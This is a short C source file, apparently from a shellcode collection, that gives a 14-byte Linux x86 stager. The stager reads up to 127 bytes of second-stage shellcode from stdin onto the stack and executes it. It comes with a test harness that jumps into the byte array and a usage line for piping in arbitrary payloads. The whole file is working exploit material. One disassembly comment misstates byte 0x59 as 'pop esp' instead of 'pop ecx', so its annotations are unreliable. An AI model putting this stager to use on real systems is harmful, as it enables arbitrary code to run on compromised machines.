/*
 * (linux/x86) stagger that reads second stage shellcode (127 bytes maximum) from stdin - 14 bytes
 * _fkz / twitter: @_fkz
 *
 * sc = "\x6A\x7F\x5A\x54\x59\x31\xDB\x6A\x03\x58\xCD\x80\x51\xC3"
 *
 * Example of use:
 * (echo -ne "\xseconde stage shellcode\x"; cat) | ./stager
 */

 char shellcode[] =

 		"\x6A\x7F"		//	push	byte	+0x7F
 		"\x5A"			//	pop		edx
 		"\x54"			//	push	esp
 		"\x59"			//	pop		esp
 		"\x31\xDB"		//	xor		ebx,ebx
 		"\x6A\x03"		//	push	byte	+0x3
 		"\x58"			//	pop		eax
 		"\xCD\x80"		//	int		0x80
 		"\x51"			//	push	ecx
 		"\xC3";			//	ret

int main(int argc, char *argv[])
{
	void (*execsh)() = (void *)&shellcode;
	execsh();
	return 0;
}